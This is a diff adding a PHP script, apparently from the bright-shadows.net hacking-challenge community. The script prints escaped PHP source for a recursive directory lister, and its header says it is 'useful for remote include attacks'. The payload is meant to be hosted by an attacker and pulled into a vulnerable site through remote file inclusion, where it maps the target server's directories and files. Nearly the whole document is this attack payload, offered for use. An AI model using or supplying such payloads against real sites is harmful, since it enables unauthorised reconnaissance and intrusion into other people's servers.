@@ -1,0 +1,41 @@
+<?php
+/***********************************************/
+/*       http://www.bright-shadows.net         */
+/*               theblacksheep                 */
+/*           list directory structure ri       */
+/* escaped (useful for remote include attacks) */
+/*         might have to customize $dir[$i]    */
+/***********************************************/
+
+echo '
+<?php
+
+$i = 0;
+$dir[$i] = \'./\';
+$array_max = 0;
+
+while(isset($dir[$i])){
+  $hdir = opendir($dir[$i]);
+  while($file = readdir($hdir)){
+   if($dir[$i] == $dir[0]){
+    $file = $dir[$i].$file;
+   }else{
+    $file = $dir[$i].\'/\'.$file;
+   }
+   if((substr($file,-2) != "/.") AND (substr($file,-3) != "/..")){
+    if(is_dir($file)){
+      echo "Dir: ".$file."<br />";
+      $dir[$array_max+1] = $file;
+      $array_max++;
+    }else{
+     echo "File: ".$file."<br />";
+    }
+   }
+  }
+  closedir($hdir);
+  $i++;
+}
+echo "Done";
+?>
+';
+?>
